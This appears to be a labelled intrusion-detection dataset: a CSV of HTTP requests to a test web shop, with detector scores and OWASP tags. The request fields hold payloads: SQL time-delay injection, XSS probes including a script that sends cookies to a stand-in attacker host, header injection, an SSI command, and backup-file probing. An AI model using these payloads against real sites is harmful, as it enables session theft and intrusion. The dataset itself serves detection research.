timestamp,url,method,body_raw,label,is_attack,score,severity,owasp,apt_phase,confidence,true_label,parse_error
2010-06-01 08:07:49,http://localhost:8080/IISSamples/sdk/asp/applications/Application_VBScript.asp,GET,"
",-1,True,0.7164,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:07:52,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja,GET,"
",-1,True,0.9695,CRITICAL,A03:2021 - Command Injection,execution,1.0,1,False
2010-06-01 08:07:54,http://localhost:8080/tienda1/publico/pagar.jsp,POST,"modo=insertar&precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja

",-1,True,0.9879,CRITICAL,A03:2021 - Command Injection,execution,1.0,1,False
2010-06-01 08:08:00,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=183&B1=Pasar+por+caja%2F,GET,"
",-1,True,0.793,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:08:14,http://localhost:8080/tienda1/publico/pagar.jsp,POST,"modo=insertar&precio=183&B1=Pasar+por+caja%2F

",-1,True,0.8232,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:08:29,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=183&B1A=Pasar+por+caja,GET,"
",-1,True,0.719,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:09:02,http://localhost:8080/tienda1/publico/pagar.jsp,POST,"modo=insertar&precio=183&B1A=Pasar+por+caja

",-1,True,0.7435,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:09:41,http://localhost:8080/tienda1/publico/registro.jsp,PUT,modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&,-1,True,0.6512,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:09:43,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar,GET,"
",-1,True,0.9538,CRITICAL,A03:2021 - XSS,initial_access,0.98,1,False
2010-06-01 08:10:19,http://localhost:8080/tienda1/publico/registro.jsp,POST,modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com,-1,True,0.9578,CRITICAL,A03:2021 - XSS,initial_access,0.98,1,False
2010-06-01 08:10:32,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=armand&password=prusiato&nombre=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar,GET,"
",-1,True,0.9731,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.59,1,False
2010-06-01 08:11:18,http://localhost:8080/tienda1/publico/registro.jsp,POST,modo=registro&login=armand&password=prusiato&nombre=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710,-1,True,0.9742,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.59,1,False
2010-06-01 08:12:00,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bau*gnon&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar,GET,"
",1,False,0.4132,NORMAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:12:45,http://localhost:8080/tienda1/publico/registro.jsp,POST,modo=registro&login=bau*gnon&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=2533,1,False,0.4412,NORMAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:13:20,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dniA=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar,GET,"
",-1,True,0.7784,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:13:47,http://localhost:8080/tienda1/publico/registro.jsp,POST,modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dniA=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332,-1,True,0.7886,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:14:02,http://localhost:8080/asf-logo-wide.gif,GET,"
",-1,True,0.7274,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:14:31,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%7C,GET,"
",-1,True,0.7867,CRITICAL,A03:2021 - Command Injection,execution,0.7,1,False
2010-06-01 08:15:09,http://localhost:8080/tienda1/publico/vaciar.jsp,POST,"B2=Vaciar+carrito%7C

",-1,True,0.8116,CRITICAL,A03:2021 - Command Injection,execution,0.7,1,False
2010-06-01 08:15:27,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,GET,"
",-1,True,0.7402,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:16:19,http://localhost:8080/tienda1/publico/vaciar.jsp,POST,"B2A=Vaciar+carrito

",-1,True,0.7707,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:17:15,http://localhost:8080/tienda1/global/menum.jsp/4861362529278789730,GET,"
",-1,True,0.7417,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:17:16,http://localhost:8080/iisstart.htm,GET,"
",-1,True,0.7644,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:18:05,http://localhost:8080/travelnet/home.jsp,GET,"
",-1,True,0.7299,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:18:57,http://localhost:8080/tienda1/miembros/imagenes.BAK,GET,"
",-1,True,0.5685,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:19:08,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif.old,GET,"
",-1,True,0.7419,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:19:53,http://localhost:8080/tienda1/miembros/index.jsp/,GET,"
",-1,True,0.5639,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:20:21,http://localhost:8080/tienda1/miembros/index.jsp.INC,GET,"
",-1,True,0.6059,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:20:43,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar,GET,"
",-1,True,1.0,CRITICAL,A03:2021 - XSS,initial_access,1.0,1,False
2010-06-01 08:21:01,http://localhost:8080/tienda1/miembros/editar.jsp,POST,modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4,-1,True,0.9998,CRITICAL,A03:2021 - XSS,initial_access,1.0,1,False
2010-06-01 08:21:11,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=%2500&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,GET,"
",-1,True,0.8189,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.53,1,False
2010-06-01 08:21:25,http://localhost:8080/tienda1/miembros/editar.jsp,POST,modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=%2500&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=40967,-1,True,0.8387,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.53,1,False
2010-06-01 08:22:14,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Il%2Ci%3Fdio&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,GET,"
",1,False,0.4649,NORMAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:22:36,http://localhost:8080/tienda1/miembros/editar.jsp,POST,modo=registro&login=thyagara&password=fUeRTe&nombre=Il%2Ci%3Fdio&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarrag,1,False,0.5009,NORMAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:22:43,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidosA=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,GET,"
",-1,True,0.821,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:22:49,http://localhost:8080/tienda1/miembros/editar.jsp,POST,modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidosA=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=,-1,True,0.8458,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:23:14,http://localhost:8080/_cti_pvt/access.cnf,GET,"
",-1,True,0.747,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:23:21,http://localhost:8080/6909030637832563290.jsp.OLD,GET,"
",-1,True,0.7065,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:23:44,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=A%F1adir+al+carrito,GET,"
",-1,True,0.9822,CRITICAL,A03:2021 - XSS,initial_access,0.92,1,False
2010-06-01 08:24:39,http://localhost:8080/tienda1/publico/anadir.jsp,POST,"id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=A%F1adir+al+carrito

",-1,True,0.989,CRITICAL,A03:2021 - XSS,initial_access,0.92,1,False
2010-06-01 08:25:02,http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1=A%F1adir+al+carrito,GET,"
",-1,True,0.8237,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:25:41,http://localhost:8080/tienda1/publico/anadir.jsp,POST,"id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1=A%F1adir+al+carrito

",-1,True,0.8416,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:25:58,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1A=A%F1adir+al+carrito,GET,"
",-1,True,0.7708,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:26:50,http://localhost:8080/tienda1/publico/anadir.jsp,POST,"id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1A=A%F1adir+al+carrito

",-1,True,0.7765,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:26:53,http://localhost:8080/CFIDE/administrator/login.cfm,GET,"
",-1,True,0.6081,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:27:40,http://localhost:8080/tienda1/publico/autenticar.jsp,PUT,"modo=entrar&login=modestin&pwd=c69p04e13&remember=off&B1=Entrar

",-1,True,0.6148,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:28:10,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=c69p04e13&remember=off&B1=Entrar,GET,"
",-1,True,0.9185,CRITICAL,A03:2021 - XSS,initial_access,0.86,1,False
2010-06-01 08:28:45,http://localhost:8080/tienda1/publico/autenticar.jsp,POST,"modo=entrar&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=c69p04e13&remember=off&B1=Entrar

",-1,True,0.9475,CRITICAL,A03:2021 - XSS,initial_access,0.86,1,False
2010-06-01 08:28:53,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=modestin&pwd=es%27pec%27ia%2Fl&remember=off&B1=Entrar,GET,"
",-1,True,0.9109,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:29:53,http://localhost:8080/tienda1/publico/autenticar.jsp,POST,"modo=entrar&login=modestin&pwd=es%27pec%27ia%2Fl&remember=off&B1=Entrar

",-1,True,0.9327,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:30:18,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=modestin&pwd=c69p04e13&remember=off&B1=Entrar,GET,"
",-1,True,0.7255,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:30:24,http://localhost:8080/tienda1/publico/autenticar.jsp,POST,"modo=entrar&loginA=modestin&pwd=c69p04e13&remember=off&B1=Entrar

",-1,True,0.7803,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:31:00,http://localhost:8080/tienda1/4861362529278789730,GET,"
",-1,True,0.7275,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:31:19,http://localhost:8080/tienda1/publico/caracteristicas.jsp,PUT,"id=1

",-1,True,0.7619,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:32:13,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%253F,GET,"
",-1,True,0.7705,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.51,1,False
2010-06-01 08:32:54,http://localhost:8080/tienda1/publico/caracteristicas.jsp,POST,"id=%253F

",-1,True,0.8373,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.51,1,False
2010-06-01 08:33:34,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,GET,"
",-1,True,0.7568,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:34:31,http://localhost:8080/tienda1/publico/caracteristicas.jsp,POST,"idA=1

",-1,True,0.8142,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:35:27,http://localhost:8080/tienda1/publico/caracteristicas.jsp.Old,GET,"
",-1,True,0.6263,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:35:51,http://localhost:8080/tienda1/asf-logo-wide,GET,"
",-1,True,0.7154,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:36:28,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,GET,"
",-1,True,0.9134,CRITICAL,A03:2021 - XSS,initial_access,0.86,1,False
2010-06-01 08:36:41,http://localhost:8080/tienda1/publico/entrar.jsp,POST,"errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org

",-1,True,0.9338,CRITICAL,A03:2021 - XSS,initial_access,0.86,1,False
2010-06-01 08:37:27,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,GET,"
",-1,True,0.9445,CRITICAL,A03:2021 - Command Injection,execution,0.91,1,False
2010-06-01 08:37:32,http://localhost:8080/tienda1/publico/entrar.jsp,POST,"errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C

",-1,True,0.9519,CRITICAL,A03:2021 - Command Injection,execution,0.91,1,False
2010-06-01 08:37:35,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,GET,"
",-1,True,0.7864,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:38:18,http://localhost:8080/tienda1/publico/entrar.jsp,POST,"errorMsgA=Credenciales+incorrectas

",-1,True,0.8033,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:38:33,http://localhost:8080/tienda1/publico/miembros.jsp.bak,GET,"
",-1,True,0.5787,WARNING,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:39:23,http://localhost:8080/iisadmpwd/achg.htr,GET,"
",-1,True,0.7444,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:39:42,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1764any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Pasar+por+caja,GET,"
",-1,True,0.9096,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.54,1,False
2010-06-01 08:39:48,http://localhost:8080/tienda1/publico/pagar.jsp,POST,"modo=insertar&precio=1764any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Pasar+por+caja

",-1,True,0.9299,CRITICAL,A07:2021 - Encoding Attack,defense_evasion,0.54,1,False
2010-06-01 08:40:43,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1764&B1=Confirmar%2F,GET,"
",-1,True,0.793,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:40:58,http://localhost:8080/tienda1/publico/pagar.jsp,POST,"modo=insertar&precio=1764&B1=Confirmar%2F

",-1,True,0.8211,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:41:54,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=1764&B1=Pasar+por+caja,GET,"
",-1,True,0.7604,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:42:01,http://localhost:8080/tienda1/publico/pagar.jsp,POST,"modoA=insertar&precio=1764&B1=Pasar+por+caja

",-1,True,0.7747,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:42:26,http://localhost:8080/tienda1/publico/4861362529278789730.bak,GET,"
",-1,True,0.726,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:42:44,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=audy&password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,GET,"
",-1,True,1.0,CRITICAL,A03:2021 - Command Injection,execution,1.0,1,False
2010-06-01 08:43:14,http://localhost:8080/tienda1/publico/registro.jsp,POST,modo=registro&login=audy&password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+S,-1,True,1.0,CRITICAL,A03:2021 - Command Injection,execution,1.0,1,False
2010-06-01 08:43:55,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=audy&password=8a9c27&nombre=%3FP%27r%F3spero&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,GET,"
",-1,True,0.7355,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
2010-06-01 08:44:49,http://localhost:8080/tienda1/publico/registro.jsp,POST,modo=registro&login=audy&password=8a9c27&nombre=%3FP%27r%F3spero&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33,-1,True,0.7853,CRITICAL,A09:2021 - Anomalous Request,reconnaissance,0.4,1,False
